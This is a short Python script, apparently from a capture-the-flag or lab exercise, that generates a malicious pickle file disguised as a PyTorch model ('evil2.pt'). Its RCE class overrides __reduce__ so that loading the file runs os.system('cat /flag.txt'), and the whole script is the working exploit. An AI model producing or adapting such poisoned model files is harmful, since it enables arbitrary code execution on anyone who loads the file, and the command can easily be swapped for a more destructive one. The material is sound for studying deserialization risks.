# Real Attack scenario 1 
# this is the script file which the attacker generates evil .pt file in his local PC

import pickle, os, io

class RCE:
    def __reduce__(self):
        cmd = "cat /flag.txt"
        return (os.system, (cmd,))

buf = io.BytesIO()
pickle.dump(RCE(), buf)  
open("evil2.pt", "wb").write(buf.getvalue())
print("evil2.pt generated")
